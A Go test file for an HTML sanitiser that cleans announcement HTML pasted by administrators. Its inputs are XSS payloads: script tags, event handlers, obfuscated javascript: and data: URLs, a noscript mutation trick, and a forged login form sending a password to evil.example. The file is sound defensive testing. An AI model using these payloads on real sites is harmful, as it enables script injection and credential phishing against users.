package htmlsafe

import (
	"os"
	"strings"
	"testing"
)

// TestSanitizeRemovesScripts covers the obvious payloads.
func TestSanitizeRemovesScripts(t *testing.T) {
	cases := []string{
		`<script>alert(1)</script>`,
		`<script src="https://evil.example/x.js"></script>`,
		`<SCRIPT>alert(1)</SCRIPT>`,
		`hello<script>alert(1)</script>world`,
		`<noscript><p title="</noscript><img src=x onerror=alert(1)>">`,
		`<iframe src="https://evil.example"></iframe>`,
		`<object data="evil.swf"></object>`,
		`<embed src="evil.swf">`,
	}

	for _, in := range cases {
		out := Sanitize(in)
		lower := strings.ToLower(out)
		for _, bad := range []string{"<script", "</script", "<iframe", "<object", "<embed", "<noscript"} {
			if strings.Contains(lower, bad) {
				t.Errorf("Sanitize(%q) = %q, still contains %q", in, out, bad)
			}
		}
	}
}

// TestSanitizeStripsEventHandlers covers on* attributes on otherwise legal tags.
func TestSanitizeStripsEventHandlers(t *testing.T) {
	cases := []string{
		`<img src="x" onerror="alert(1)">`,
		`<div onclick="alert(1)">click</div>`,
		`<p onmouseover=alert(1)>hover</p>`,
		`<a href="#" ONCLICK="alert(1)">x</a>`,
		`<body onload=alert(1)>`,
		`<svg onload=alert(1)></svg>`,
	}

	for _, in := range cases {
		out := strings.ToLower(Sanitize(in))
		if strings.Contains(out, "onerror") || strings.Contains(out, "onclick") ||
			strings.Contains(out, "onmouseover") || strings.Contains(out, "onload") {
			t.Errorf("Sanitize(%q) = %q, event handler survived", in, out)
		}
		if strings.Contains(out, "<body") || strings.Contains(out, "<svg") {
			t.Errorf("Sanitize(%q) = %q, disallowed element survived", in, out)
		}
	}
}

// TestSanitizeBlocksJavascriptURLs covers scheme-based script execution, which
// does not need an event handler.
func TestSanitizeBlocksJavascriptURLs(t *testing.T) {
	cases := []string{
		`<a href="javascript:alert(1)">click</a>`,
		`<a href="JaVaScRiPt:alert(1)">click</a>`,
		`<a href=" javascript:alert(1)">click</a>`,
		`<a href="java	script:alert(1)">click</a>`,
		`<a href="java&#09;script:alert(1)">click</a>`,
		`<a href="vbscript:msgbox(1)">click</a>`,
		`<a href="data:text/html,<script>alert(1)</script>">click</a>`,
		`<img src="javascript:alert(1)">`,
	}

	for _, in := range cases {
		out := strings.ToLower(Sanitize(in))
		if strings.Contains(out, "javascript:") || strings.Contains(out, "vbscript:") ||
			strings.Contains(out, "data:") {
			t.Errorf("Sanitize(%q) = %q, unsafe URL survived", in, out)
		}
	}
}

// TestSanitizeAllowsFormatting is the positive case: ordinary formatting must
// survive intact, otherwise the feature is useless.
func TestSanitizeAllowsFormatting(t *testing.T) {
	in := `<h2>标题</h2><p>这是<strong>加粗</strong>和<em>斜体</em>，还有 <a href="https://example.com">链接</a>。</p>` +
		`<ul><li>一</li><li>二</li></ul><table><tr><td>a</td><td>b</td></tr></table>` +
		`<img src="https://example.com/x.png" alt="图">`
	out := Sanitize(in)

	for _, want := range []string{
		"<h2>标题</h2>", "<strong>加粗</strong>", "<em>斜体</em>",
		`<a href="https://example.com">链接</a>`, "<ul>", "<li>一</li>",
		"<table>", "<td>a</td>", `<img src="https://example.com/x.png" alt="图">`,
	} {
		if !strings.Contains(out, want) {
			t.Errorf("Sanitize(%q) = %q, missing %q", in, out, want)
		}
	}
}

// TestSanitizeUnwrapsUnknownTags keeps the author's text when they use a tag we
// do not allow, instead of silently deleting their words.
func TestSanitizeUnwrapsUnknownTags(t *testing.T) {
	out := Sanitize(`<font color="red">重要通知</font>`)
	if !strings.Contains(out, "重要通知") {
		t.Errorf("Sanitize dropped the text of an unknown tag: %q", out)
	}
	if strings.Contains(strings.ToLower(out), "<font") {
		t.Errorf("Sanitize kept a disallowed tag: %q", out)
	}
}

// TestSanitizeDropsForms guards the credential-phishing surface: a forged login
// form inside the announcement modal.
func TestSanitizeDropsForms(t *testing.T) {
	in := `<form action="https://evil.example/steal"><input name="password"><button>登录</button></form>`
	out := strings.ToLower(Sanitize(in))
	for _, bad := range []string{"<form", "<input", "<button"} {
		if strings.Contains(out, bad) {
			t.Errorf("Sanitize(%q) = %q, kept %q", in, out, bad)
		}
	}
}

// TestSanitizeTargetBlankGetsNoopener prevents reverse tabnabbing.
func TestSanitizeTargetBlankGetsNoopener(t *testing.T) {
	out := Sanitize(`<a href="https://example.com" target="_blank">x</a>`)
	if !strings.Contains(out, "rel=\"noopener noreferrer\"") {
		t.Errorf("Sanitize did not add rel=noopener for target=_blank: %q", out)
	}
}

// TestSanitizeEscapesText ensures literal angle brackets in text stay text.
func TestSanitizeEscapesText(t *testing.T) {
	out := Sanitize(`比较 1 < 2 和 3 > 2`)
	if !strings.Contains(out, "&lt;") || !strings.Contains(out, "&gt;") {
		t.Errorf("Sanitize did not escape literal brackets: %q", out)
	}
}

// TestSanitizeEmpty confirms blank input stays blank.
func TestSanitizeEmpty(t *testing.T) {
	for _, in := range []string{"", "   ", "\n\t "} {
		if got := Sanitize(in); got != "" {
			t.Errorf("Sanitize(%q) = %q, want empty", in, got)
		}
	}
}

// TestSanitizeIsIdempotent guards against double-encoding regressions when a
// sanitised value is re-saved from the admin form.
func TestSanitizeIsIdempotent(t *testing.T) {
	inputs := []string{
		`<p>普通<strong>文本</strong></p>`,
		`<script>alert(1)</script><p>ok</p>`,
		`<a href="https://example.com" target="_blank">x</a>`,
		`比较 1 < 2`,
	}
	for _, in := range inputs {
		once := Sanitize(in)
		twice := Sanitize(once)
		if once != twice {
			t.Errorf("Sanitize not idempotent for %q: once=%q twice=%q", in, once, twice)
		}
	}
}

// TestSanitizeKeepsScopedStyle covers the announcement use case: a <style>
// block is no longer discarded wholesale, it is scoped and re-emitted once.
func TestSanitizeKeepsScopedStyle(t *testing.T) {
	in := `<style>.card { color: #333; padding: 10px }</style><div class="card">内容</div>`
	out := Sanitize(in)

	if !strings.HasPrefix(out, "<style>") {
		t.Fatalf("style block should lead the output, got %q", out)
	}
	if !strings.Contains(out, "[data-cr-announcement] .card{color:#333;padding:10px}") {
		t.Errorf("scoped rule missing: %q", out)
	}
	if strings.Count(out, "<style") != 1 {
		t.Errorf("expected exactly one <style>, got %q", out)
	}
	if !strings.Contains(out, `<div class="card">内容</div>`) {
		t.Errorf("content lost: %q", out)
	}
}

// TestSanitizePastWholeDocument reproduces the actual administrator workflow:
// a saved HTML page pasted into the announcement box.
func TestSanitizePastWholeDocument(t *testing.T) {
	in := `<!DOCTYPE html>
<html lang="zh-CN"><head><meta charset="utf-8"><title>公告</title>
<style>body { background: #f4f6f8 } .card { border-top: 5px solid #0056b3 }</style>
</head><body><div class="card">内容</div><script>alert(1)</script></body></html>`
	out := Sanitize(in)

	for _, bad := range []string{"<!DOCTYPE", "<html", "<head", "<title", "<meta", "<script", "alert(1)"} {
		if strings.Contains(strings.ToLower(out), strings.ToLower(bad)) {
			t.Errorf("Sanitize(%q) = %q, still contains %q", in, out, bad)
		}
	}
	if !strings.Contains(out, "[data-cr-announcement]{background:#f4f6f8}") {
		t.Errorf("body rule not mapped to the container: %q", out)
	}
	if !strings.Contains(out, "[data-cr-announcement] .card{border-top:5px solid #0056b3}") {
		t.Errorf("class rule not scoped: %q", out)
	}
	if !strings.Contains(out, `<div class="card">内容</div>`) {
		t.Errorf("content lost: %q", out)
	}
}

// TestSanitizeFiltersStyleAttribute: inline styles are kept, but only for the
// harmless property subset.
func TestSanitizeFiltersStyleAttribute(t *testing.T) {
	in := `<p style="color: #333; position: fixed; background: url(http://evil.example/x.png); min-height: 100vh">x</p>`
	out := Sanitize(in)
	if !strings.Contains(out, `style="color:#333"`) {
		t.Errorf("safe declarations lost: %q", out)
	}
	for _, bad := range []string{"position", "url(", "vh"} {
		if strings.Contains(strings.ToLower(out), bad) {
			t.Errorf("Sanitize(%q) = %q, kept %q", in, out, bad)
		}
	}

	// An attribute with nothing safe left is removed entirely.
	if out := Sanitize(`<p style="position: fixed">x</p>`); strings.Contains(out, "style=") {
		t.Errorf("empty style attribute should be dropped, got %q", out)
	}
}

// TestSanitizeAnnouncementSample runs the acceptance baseline: the exact
// document the administrator pasted must come out scoped, script-free and
// layout-complete apart from the viewport-sizing declarations.
func TestSanitizeAnnouncementSample(t *testing.T) {
	raw, err := os.ReadFile("../../docs/announcement-css/sample.html")
	if err != nil {
		t.Fatalf("read sample: %v", err)
	}
	out := Sanitize(string(raw))

	// Every authored class survives, scoped to the container.
	for _, class := range []string{
		".announcement-card", ".header", ".header h1", ".content", ".notice-box",
		".notice-box strong", ".detail-list", ".detail-list li", ".label",
		".status-badge", ".status-stop", ".status-normal", ".footer",
	} {
		if !strings.Contains(out, "[data-cr-announcement] "+class+"{") {
			t.Errorf("rule for %q missing", class)
		}
	}

	// The visual essentials are preserved.
	for _, want := range []string{
		"background-color:#ffffff",
		"border-radius:8px",
		"box-shadow:0 4px 12px rgba(0, 0, 0, 0.08)",
		"border-top:5px solid #0056b3",
		"background-color:#fff8e1",
		"border-left:4px solid #ffc107",
		"background-color:#ffebee",
		"color:#c62828",
		"background-color:#e8f5e9",
		"color:#2e7d32",
		"display:flex",
		"justify-content:center",
		"text-align:right",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("declaration %q missing from output", want)
		}
	}

	// The viewport sizing is dropped, so the card cannot fill the page.
	if strings.Contains(out, "100vh") {
		t.Errorf("viewport unit survived: %q", out)
	}

	// Nothing executable or externally loaded.
	for _, bad := range []string{"<script", "<title", "<meta", "<!DOCTYPE", "<html", "<head", "url(", "@import"} {
		if strings.Contains(strings.ToLower(out), strings.ToLower(bad)) {
			t.Errorf("payload %q survived", bad)
		}
	}
}

// TestSanitizeStyleIsIdempotent guards the write→read double sanitisation: the
// stored value is sanitised again when it is read back for display.
func TestSanitizeStyleIsIdempotent(t *testing.T) {
	inputs := []string{
		`<style>body{background:#f4f6f8;display:flex}.card{color:#333}</style><div class="card">x</div>`,
		`<p style="color: red">x</p>`,
		`<style>@media (max-width: 600px) { .card { padding: 10px } }</style><div class="card">x</div>`,
	}
	for _, in := range inputs {
		once := Sanitize(in)
		twice := Sanitize(once)
		if once != twice {
			t.Errorf("Sanitize not idempotent for %q:\n once=%q\ntwice=%q", in, once, twice)
		}
	}
}
